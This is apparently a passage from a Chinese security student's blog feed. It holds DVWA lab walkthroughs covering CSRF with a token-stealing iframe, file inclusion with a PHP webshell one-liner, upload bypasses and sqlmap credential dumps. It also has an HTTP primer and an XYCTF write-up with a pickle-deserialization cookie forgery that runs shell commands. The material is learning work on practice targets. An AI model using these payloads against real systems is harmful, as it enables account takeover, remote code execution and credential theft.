<h2 id="medium-2"><a href="#medium-2" class="headerlink" title="medium"></a>medium</h2><p>这关主要改变的代码是</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">stripos</span>( <span class="variable">$_SERVER</span>[ <span class="string">&#x27;HTTP_REFERER&#x27;</span> ] ,<span class="variable">$_SERVER</span>[ <span class="string">&#x27;SERVER_NAME&#x27;</span> ]) !== <span class="literal">false</span> </span><br></pre></td></tr></table></figure>

<p>代码检查了保留变量 <strong>HTTP_REFERER</strong>（http包头的Referer参数的值，表示来源地址）中是否包含<strong>SERVER_NAME</strong>（http包头的Host参数，及要访问的主机名）</p>
<p>这个检查的作用是验证用户是否是从同一个网站上的另一个页面跳转过来的，防止外部链接直接访问某些页面，增加网站安全性。</p>
<p>我们可以抓包修改请求头referer</p>
<p>我们也可以绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">目录混淆法：将HTML页面放在127.0.0.1目录下，构建payload</span><br><span class="line">http://www.xxx.com/127.0.0.1/csrf.html</span><br><span class="line"></span><br><span class="line">文件名混淆法：将HTML文件重命名为127.0.0.1，构建payload</span><br><span class="line">http://www.xxx.com/127.0.0.1.html</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="high-2"><a href="#high-2" class="headerlink" title="high"></a>high</h2><h3 id="application-json"><a href="#application-json" class="headerlink" title="application&#x2F;json"></a>application&#x2F;json</h3><p>查看源码发现</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">json_decode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>), <span class="literal">true</span>); </span><br></pre></td></tr></table></figure>

<p>这是针对<strong>application&#x2F;json</strong>类型的数据</p>
<ol>
<li><p><strong>数据格式</strong>：</p>
<ul>
<li>数据以JSON（JavaScript Object Notation）格式表示。</li>
<li>JSON格式可以表示更复杂的数据结构，如数组、对象、嵌套对象等。</li>
<li>字符串需要用双引号包裹。</li>
</ul>
<p>示例：<code>&#123;&quot;name&quot;: &quot;John Doe&quot;, &quot;age&quot;: 30, &quot;city&quot;: &quot;New York&quot;&#125;</code></p>
</li>
<li><p><strong>用途</strong>：</p>
<ul>
<li>适用于现代Web应用程序，特别是那些使用Ajax技术进行数据交换的应用程序。</li>
<li>适合传输复杂或结构化数据。</li>
</ul>
</li>
</ol>
<p>虽然有这个解析代码但我们这的请求中不是这类数据。</p>
<p>源码中新增了 <code>checkToken( $token, $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); </code>来检查token。</p>
<p>那么我们就需要获取用户的token。</p>
<h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>由于现在的浏览器是不允许跨域请求，即攻击者的服务器192.168.67.140不能向被攻击的服务器192.168.67.143发送请求，除非是被攻击服务器主动发给攻击者服务器。那么我们只能将我们的攻击页面放在被攻击者的服务器引诱受害者访问，攻击页面代码如下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot;&gt; </span><br><span class="line">    function attack() &#123;</span><br><span class="line"> </span><br><span class="line">   document.getElementsByName(&#x27;user_token&#x27;)[0].value=document.getElementById(&quot;hack&quot;).contentWindow.document.getElementsByName(&#x27;user_token&#x27;)[0].value;</span><br><span class="line">   document.getElementById(&quot;transfer&quot;).submit();   &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;iframe src=&quot;http://192.168.153.130/dvwa/vulnerabilities/csrf&quot; id=&quot;hack&quot; border=&quot;0&quot; style=&quot;display:none;&quot;&gt;</span><br><span class="line">&lt;/iframe&gt;</span><br><span class="line"> </span><br><span class="line">&lt;body οnlοad=&quot;attack()&quot;&gt;</span><br><span class="line"> &lt;form method=&quot;GET&quot; id=&quot;transfer&quot; action=&quot;http://192.168.153.130/dvwa/vulnerabilities/csrf&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;password&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;password&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;hidden&quot; name=&quot;user_token&quot; value=&quot;&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot;&gt;</span><br><span class="line"> &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ol>
<li>在<code>&lt;script&gt;</code>标签中定义了一个JavaScript函数<code>attack()</code>，该函数的作用是：<ul>
<li>从隐藏的<code>&lt;iframe&gt;</code>中获取名为<code>user_token</code>的元素的值（这通常是用来防止CSRF攻击的一种令牌）。</li>
<li>将获取到的<code>user_token</code>值设置到当前页面表单中名为<code>user_token</code>的隐藏输入字段。</li>
<li>提交表单<code>transfer</code>。</li>
</ul>
</li>
</ol>
<h3 id="方法二（与XSS结合）"><a href="#方法二（与XSS结合）" class="headerlink" title="方法二（与XSS结合）"></a>方法二（与XSS结合）</h3><h3 id="方法三（bp自动识别token）"><a href="#方法三（bp自动识别token）" class="headerlink" title="方法三（bp自动识别token）"></a>方法三（bp自动识别token）</h3><h1 id="File-Inclusion（文件包含）"><a href="#File-Inclusion（文件包含）" class="headerlink" title="File Inclusion（文件包含）"></a>File Inclusion（文件包含）</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>随着网站业务的需求，程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，但是正是这种灵活性通过动态变 量的方式引入需要包含的文件时，用户对这个变量可控而且服务端又没有做合理的校验或者校验被绕过就造成了文件包含漏洞。</p>
<p>require()：可以包含文件，如果包含错了，直接报错并退出程序的执行<br>include()：在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行<br>require_once()：与require类似，区别在于当重复调用同一文件时，程序只调用一次<br>include_once()：与include类似，区别在于当重复调用同一文件时，程序只调用一次</p>
<h2 id="low-3"><a href="#low-3" class="headerlink" title="low"></a>low</h2><p> <strong>法一</strong></p>
<p>我们发现这里是利用url中page的值来传输想要访问的文件的名的，然后在index.php中进行包含。</p>
<p>我们需要利用File upload的部分来上传一个能生成木马的php脚本，然后在我们这个页面访问它，当它被包含的时候会被当做php脚本执行便能生成含有一句话木马的脚本，我们便能利用蚁剑进行连接。</p>
<p><strong>法二</strong></p>
<p>我们还能利用远程文件包含，访问外部站点中的生成一句话木马的文件，这样我们便不需要上传文件。例如</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>PHP <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php eval($_POST[pass])?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="medium-3"><a href="#medium-3" class="headerlink" title="medium"></a>medium</h2><p>查看源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">// The page we wish to display</span><br><span class="line">$file = $_GET[ &#x27;page&#x27; ];</span><br><span class="line"></span><br><span class="line">// Input validation</span><br><span class="line">$file = str_replace( array( &quot;http://&quot;, &quot;https://&quot; ), &quot;&quot;, $file );</span><br><span class="line">$file = str_replace( array( &quot;../&quot;, &quot;..\\&quot; ), &quot;&quot;, $file );</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>

<p>这里利用str_replace来过滤我们的输入。</p>
<p>那么我们在进行本地文件包含和远程文件包含的时候只要注意利用双写来绕过str_replace函数。</p>
<h2 id="high-3"><a href="#high-3" class="headerlink" title="high"></a>high</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">// The page we wish to display</span><br><span class="line">$file = $_GET[ &#x27;page&#x27; ];</span><br><span class="line"></span><br><span class="line">// Input validation</span><br><span class="line">if( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) &#123;</span><br><span class="line">    // This isn&#x27;t the page we want!</span><br><span class="line">    echo &quot;ERROR: File not found!&quot;;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>

<p>这里要求我们输入的字符串必须以<code>file</code>开头，那么我们可以使用伪协议file:&#x2F;&#x2F;&#x2F;进行绕过。</p>
<h1 id="file-upload"><a href="#file-upload" class="headerlink" title="file upload"></a>file upload</h1><h2 id="low-4"><a href="#low-4" class="headerlink" title="low"></a>low</h2><p>查看源码发现并没有对上传的文件进行任何过滤，我们直接上传一个一句话木马再用蚁剑进行连接。</p>
<h2 id="medium-4"><a href="#medium-4" class="headerlink" title="medium"></a>medium</h2><p>这个属于检测上传文件的mime类型，我们直接抓包修改就行了。</p>
<h2 id="high-4"><a href="#high-4" class="headerlink" title="high"></a>high</h2><p>这里利用getimagesize（）函数检测文件，那么我们只需要把一句话木马和正常文件拼接起来，便能上传成功.我们再利用文件包含漏洞就能成功利用蚁剑连接。由于有白名单限制，所以利用.user.ini或.htaccess文件的方法貌似不行。</p>
<h1 id="sql注入-1"><a href="#sql注入-1" class="headerlink" title="sql注入"></a>sql注入</h1><p>由于之前打过靶场，这里就利用sqlmap来进行注入。</p>
<p><strong>使用sqlmap进行SQL注入的基本步骤</strong><br>查看sqlmap相关参数，命令格式为：sqlmap -h<br>找到一个可利用的网址，判断网站数据库类型，命令格式为：sqlmap -u<br>确定数据库类型为mysql后，查看存在的数据库，命令格式为：sqlmap -u 目标网址–dbs<br>查看数据库中存在的表，命令格式为：sqlmap -u 目标网址–tables -D 数据库名<br>获取表中的字段，命令格式为：sqlmap -u 目标网址– columns -T 表名 -D 数据库名<br>猜解出字段，查看表里的存储内容，命令格式为：sqlmap -u 目标网址– dump -C 字段名称 -T 表名 -D 数据库名</p>
<h2 id="low-5"><a href="#low-5" class="headerlink" title="low"></a>low</h2><p>由于dvwa需要登录，所以我们需要先抓包获取cookie。</p>
<p><code>security=low; PHPSESSID=e5bk9sguspes5davp15hiknij</code></p>
<p>使用<code>sqlmap.py -u &quot;http://dvwa:8898/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=e5bk9sguspes5davp15hiknij&quot; --batch --dbs</code></p>
<p>获取数据库</p>
<p><code>sqlmap.py -u &quot;http://dvwa:8898/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=e5bk9sguspes5davp15hiknij&quot; --batch --current-db</code></p>
<p>获取当前数据库</p>
<p><code>sqlmap.py -u &quot;http://dvwa:8898/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=e5bk9sguspes5davp15hiknij&quot; --batch -D dvwa --tables</code></p>
<p>查表</p>
<p><code>sqlmap.py -u &quot;http://dvwa:8898/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=e5bk9sguspes5davp15hiknij&quot; --batch -D dvwa -T users --columns</code></p>
<p>查数据列</p>
<p><code>sqlmap.py -u &quot;http://dvwa:8898/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=e5bk9sguspes5davp15hiknij&quot; --batch -D dvwa -T user -C &quot;user,password&quot; --dump</code></p>
<p>查用户名与密码。</p>
<h2 id="medium-5"><a href="#medium-5" class="headerlink" title="medium"></a>medium</h2><p>改成了POST方法，我们只需要使用–data传输参数就行。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://dvwa:8898/vulnerabilities/sqli/#&quot; -data &quot;id=1&amp;Submit=Submit&quot; --cookie=&quot;PHPSESSID=b03cjnsi079pmeu9sse5up5kgf; security=medium&quot; --batch -dbs</span><br></pre></td></tr></table></figure>

<p>可以正常显示</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">available databases [2]:</span><br><span class="line">[*] dvwa</span><br><span class="line">[*] information_schema</span><br></pre></td></tr></table></figure>

<p>接下来就和之前的步骤一样</p>
<h2 id="high-5"><a href="#high-5" class="headerlink" title="high"></a>high</h2><p><strong>手动注入</strong></p>
<p>看了下好像是在查询的时候是在另一个页面进行的，但是数据回显还是在原来的页面，由于源代码中有</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#x27; ); </span><br></pre></td></tr></table></figure>

<p>所以这里不能用报错注入，我们直接用正常的联合查询就行了。</p>
<p><strong>sqlmap</strong></p>
<p>这里我们就要用到–second-u参数这个参数的作用：</p>
<p><strong>当测试存储型 SQL 注入时，攻击者可能需要先向一个 URL 提交恶意数据（例如通过表单），然后在另一个 URL（如显示数据的页面）触发漏洞。<code>--second-u</code> 用于指定触发注入的第二个 URL，使 sqlmap 能够检测这类延迟触发的漏洞。</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;dvwa:8898/vulnerabilities/sqli/session-input.php#&quot; --second-u &quot;http://dvwa:8898/vulnerabilities/sqli/&quot; -data &quot;id=1&amp;Submit=Submit&quot; --cookie=&quot;PHPSESSID=b03cjnsi079pmeu9sse5up5kgf; security=high&quot; --batch -dbs</span><br></pre></td></tr></table></figure>

<p>可以正确查询到数据库，接下来和之前的一样。</p>
<h1 id="sql盲注"><a href="#sql盲注" class="headerlink" title="sql盲注"></a>sql盲注</h1><p>我这里直接试验high难度的，发现和普通sql的high难度差不多，不过是盲注，直接构造</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;dvwa:8898/vulnerabilities/sqli_blind/cookie-input.php#&quot; --second-u &quot;http://dvwa:8898/vulnerabilities/sqli_blind/&quot; -data &quot;id=1&amp;Submit=Submit&quot; --cookie=&quot;id=1; PHPSESSID=b03cjnsi079pmeu9sse5up5kgf; security=high&quot; --batch -dbs</span><br></pre></td></tr></table></figure>

<p>发现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">Parameter: id (POST)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: id=1&#x27; AND 4605=4605 AND &#x27;qJMJ&#x27;=&#x27;qJMJ&amp;Submit=Submit</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 OR time-based blind (SLEEP - comment)</span><br><span class="line">    Payload: id=1&#x27; OR SLEEP(5)#&amp;Submit=Submit</span><br><span class="line">---</span><br><span class="line">available databases [2]:</span><br><span class="line">[*] dvwa</span><br><span class="line">[*] information_schema</span><br></pre></td></tr></table></figure>

<p>存在两种注入方式。</p>
<h1 id="Weak-Session-IDs"><a href="#Weak-Session-IDs" class="headerlink" title="Weak Session IDs"></a>Weak Session IDs</h1><h2 id="low-6"><a href="#low-6" class="headerlink" title="low"></a>low</h2><p>由标题可知这关是在session id上下文章,查看源码发现我们每点一次按钮，cookie中的dvwasession的值便会增加1，那么我们知道了生成规律便可以伪造dvwasession进行登录操作。</p>
<h2 id="medium-6"><a href="#medium-6" class="headerlink" title="medium"></a>medium</h2><p>查看源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$html = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] == &quot;POST&quot;) &#123;</span><br><span class="line">    $cookie_value = time();</span><br><span class="line">    setcookie(&quot;dvwaSession&quot;, $cookie_value);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>

<p>是利用时间戳生成id的，那么我们便可以定时攻击。</p>
<h2 id="high-6"><a href="#high-6" class="headerlink" title="high"></a>high</h2><p>这里和第一关差不多，不过把dvwasession的值md5加密了</p>
]]></content>
      <tags>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title>http网络协议</title>
    <url>/2025/08/02/http%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<p>q</p>
<h1 id="什么是协议？"><a href="#什么是协议？" class="headerlink" title="什么是协议？"></a>什么是协议？</h1><p>指计算机在网络通讯中必须共同遵守的规定或规则。</p>
<h1 id="什么是http协议"><a href="#什么是http协议" class="headerlink" title="什么是http协议"></a>什么是http协议</h1><p>HTTP(Hypertext Transfer Protocol)超文本传输协议。是web服务器和客户端进行数据传输的规则，是一个无状态（每次的请求都是独立的）的应用层协议（处理应用程序细节）</p>
<p><img src="/../images/2020060216401224.jpg" alt="2020060216401224" loading="lazy"></p>
<h1 id="什么是HTTPS协议"><a href="#什么是HTTPS协议" class="headerlink" title="什么是HTTPS协议"></a>什么是HTTPS协议</h1><p>在http的基础增加了传输加密和身份认证，保证了传输过程的安全性。</p>
<h1 id="HTTP协议工作原理"><a href="#HTTP协议工作原理" class="headerlink" title="HTTP协议工作原理"></a>HTTP协议工作原理</h1><p><img src="/../images/1754124765626.png" alt="1754124765626" loading="lazy"></p>
<h1 id="持久-非持久性连接"><a href="#持久-非持久性连接" class="headerlink" title="持久&#x2F;非持久性连接"></a>持久&#x2F;非持久性连接</h1><p><strong>持久性连接</strong></p>
<p>在一个连接中可以进行多次文档请求和响应。即服务器在发送完响应后不释放连接。</p>
<p><strong>非持久性连接</strong></p>
<p>浏览器每进行一次请求就要创建一个新的连接。</p>
<h1 id="HTTP状态码"><a href="#HTTP状态码" class="headerlink" title="HTTP状态码"></a>HTTP状态码</h1><p><strong>分类</strong></p>
<p><img src="/../images/1754316232273.jpg" alt="1754316232273" loading="lazy"></p>
<p><strong>常见状态码</strong></p>
<p><img src="/../images/1754316385170.jpg" alt="1754316385170" loading="lazy"></p>
<h1 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h1><p>对异源请求进行限制</p>
<p><strong>同源</strong></p>
<p>指的是协议，域名，端口相同</p>
<p><strong>同源请求</strong></p>
<p><img src="/../images/1754317531521.jpg" alt="1754317531521" loading="lazy"></p>
]]></content>
  </entry>
  <entry>
    <title>XYCTF复现</title>
    <url>/2025/04/28/XYCTF%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="SIGNIN"><a href="#SIGNIN" class="headerlink" title="SIGNIN"></a>SIGNIN</h1><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a><strong>源码</strong></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    :   main.py</span></span><br><span class="line"><span class="string">@Time    :   2025/03/28 22:20:49</span></span><br><span class="line"><span class="string">@Author  :   LamentXU </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">flag in /flag_&#123;uuid4&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">from</span> bottle <span class="keyword">import</span> Bottle, request, response, redirect, static_file, run, route</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;../../secret.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    secret = f.read()</span><br><span class="line"></span><br><span class="line">app = Bottle()</span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;HI&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/download&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>():</span><br><span class="line">    name = request.query.filename</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;../../&#x27;</span> <span class="keyword">in</span> name <span class="keyword">or</span> name.startswith(<span class="string">&#x27;/&#x27;</span>) <span class="keyword">or</span> name.startswith(<span class="string">&#x27;../&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;\\&#x27;</span> <span class="keyword">in</span> name:</span><br><span class="line">        response.status = <span class="number">403</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Forbidden&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(name, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/secret&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">secret_page</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        session = request.get_cookie(<span class="string">&quot;name&quot;</span>, secret=secret)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> session <span class="keyword">or</span> session[<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;guest&quot;</span>:</span><br><span class="line">            session = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;guest&quot;</span>&#125;</span><br><span class="line">            response.set_cookie(<span class="string">&quot;name&quot;</span>, session, secret=secret)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Forbidden!&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> session[<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;The secret has been deleted!&#x27;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Error!&quot;</span></span><br><span class="line">run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>

<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p>想要读取密钥就要绕过<code>if &#39;../../&#39; in name or name.startswith(&#39;/&#39;) or name.startswith(&#39;../&#39;) or &#39;\\&#39; in name:</code></p>
<p>我们可以想到利用**.&#x2F;**进行绕过。</p>
<p><img src="/../images/1745917698128.png" alt="1745917698128" loading="lazy"></p>
<h2 id="pickle反序列化"><a href="#pickle反序列化" class="headerlink" title="pickle反序列化"></a>pickle反序列化</h2><p>由</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">secret_page</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        session = request.get_cookie(<span class="string">&quot;name&quot;</span>, secret=secret)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> session <span class="keyword">or</span> session[<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;guest&quot;</span>:</span><br><span class="line">            session = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;guest&quot;</span>&#125;</span><br><span class="line">            response.set_cookie(<span class="string">&quot;name&quot;</span>, session, secret=secret)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Forbidden!&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> session[<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;The secret has been deleted!&#x27;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Error!&quot;</span></span><br></pre></td></tr></table></figure>

<p>发现在get_cookie中有反序列化</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_cookie</span>(<span class="params">self, key, default=<span class="literal">None</span>, secret=<span class="literal">None</span>, digestmod=hashlib.sha256</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; Return the content of a cookie. To read a `Signed Cookie`, the</span></span><br><span class="line"><span class="string">        `secret` must match the one used to create the cookie (see</span></span><br><span class="line"><span class="string">        :meth:`BaseResponse.set_cookie`). If anything goes wrong (missing</span></span><br><span class="line"><span class="string">        cookie or wrong signature), return a default value. &quot;&quot;&quot;</span></span><br><span class="line">    value = <span class="variable language_">self</span>.cookies.get(key)</span><br><span class="line">    <span class="keyword">if</span> secret:</span><br><span class="line">        <span class="comment"># See BaseResponse.set_cookie for details on signed cookies.</span></span><br><span class="line">        <span class="keyword">if</span> value <span class="keyword">and</span> value.startswith(<span class="string">&#x27;!&#x27;</span>) <span class="keyword">and</span> <span class="string">&#x27;?&#x27;</span> <span class="keyword">in</span> value:</span><br><span class="line">            sig, msg = <span class="built_in">map</span>(tob, value[<span class="number">1</span>:].split(<span class="string">&#x27;?&#x27;</span>, <span class="number">1</span>))</span><br><span class="line">            <span class="built_in">hash</span> = hmac.new(tob(secret), msg, digestmod=digestmod).digest()</span><br><span class="line">            <span class="keyword">if</span> _lscmp(sig, base64.b64encode(<span class="built_in">hash</span>)):</span><br><span class="line">                dst = pickle.loads(base64.b64decode(msg))</span><br><span class="line">                <span class="keyword">if</span> dst <span class="keyword">and</span> dst[<span class="number">0</span>] == key:</span><br><span class="line">                    <span class="keyword">return</span> dst[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">return</span> default</span><br><span class="line">    <span class="keyword">return</span> value <span class="keyword">or</span> default</span><br></pre></td></tr></table></figure>

<p>简单来说就是签名正确就能进行pickle的反序列化。</p>
<p>脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_cookie</span>(<span class="params">payload</span>):</span><br><span class="line">    b64pld = base64.b64encode(payload)</span><br><span class="line">    signature = base64.b64encode(</span><br><span class="line">        hmac.new(</span><br><span class="line">            <span class="string">b&quot;Hell0_H@cker_Y0u_A3r_Sm@r7&quot;</span>, b64pld, hashlib.sha256</span><br><span class="line">        ).digest()</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;&quot;!&#x27;</span> + signature + <span class="string">b&quot;?&quot;</span> + b64pld + <span class="string">b&#x27;&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data = <span class="string">b&#x27;&#x27;&#x27;(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">S&#x27;cat /flag_* &gt; flag&#x27;</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(gen_cookie(data).decode())</span><br></pre></td></tr></table></figure>

<p>替换session后再用&#x2F;download路由读取flag。</p>
<p><img src="/../images/3c872f66-9a61-40d3-aa0c-bebecb1676e4.png" alt="3c872f66-9a61-40d3-aa0c-bebecb1676e4" loading="lazy"></p>
<p>还有一个更简单的利用set_cookie函数的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bottle <span class="keyword">import</span> Bottle, request, response,run, route</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cmd</span>():</span><br><span class="line">     <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">         <span class="keyword">return</span> (<span class="built_in">exec</span>,(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /f*&gt;/app/app/app.py&#x27;).read()&quot;</span>,))</span><br><span class="line"> </span><br><span class="line">c = cmd()</span><br><span class="line"><span class="comment">#session = &#123;&quot;name&quot;:c&#125;</span></span><br><span class="line">response.set_cookie(<span class="string">&quot;name&quot;</span>,c,secret=<span class="string">&quot;Hell0_H@cker_Y0u_A3r_Sm@r7&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(response._cookies)</span><br></pre></td></tr></table></figure>

<p>同上，然后访问app.py</p>
<p>就能得到flag</p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>less18-22</title>
    <url>/2024/11/24/less18-22/</url>
    <content><![CDATA[<h1 id="less18"><a href="#less18" class="headerlink" title="less18"></a>less18</h1><p>如果输入正确的账号密码，则页面回显你的ip与user-agent</p>
<p><img src="/../images/1732457032265.png" alt="1732457032265" loading="lazy"></p>
<p>如果错误登录则只会回显ip，显然不能进行之前的注入。</p>
<p>我们查看源码（这里是一部分）</p>
<p><img src="/../images/1732419575415.jpg" alt="1732419575415" loading="lazy"></p>
<p>发现密码和账户都被17关的过滤给保护起来了。因此显然难以通过账户密码进行注入，但我们可以发现在查询成功处有给insert操作将uagent，与ip和uname插入括号里的三个字段中，我们便能想到通过修改uagent的值进行注入。</p>
<p>要修改这个值我们需使用burp suite来进行抓包。</p>
<p>并且修改user-agent的值。</p>
<p><img src="/../images/1733489271913.jpg" alt="1733489271913" loading="lazy"></p>
